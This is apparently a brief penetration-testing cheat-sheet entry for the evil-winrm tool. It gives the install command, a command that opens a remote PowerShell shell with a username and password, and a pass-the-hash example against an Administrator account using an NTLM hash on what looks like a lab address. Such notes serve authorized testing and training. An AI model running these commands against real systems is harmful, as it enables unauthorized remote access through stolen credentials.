-- -
### Install
```bash
sudo gem install evil-winrm
```
### Usage
```bash
# results in a shell (over PowerShell Remot Protocol)
evil-winrm -i <IP> -u <username> -p <password> 

# Pass-the-Hash
evil-winrm -i 10.129.201.57  -u  Administrator -H "64f12cddaa88057e06a81b54e73b949b"
```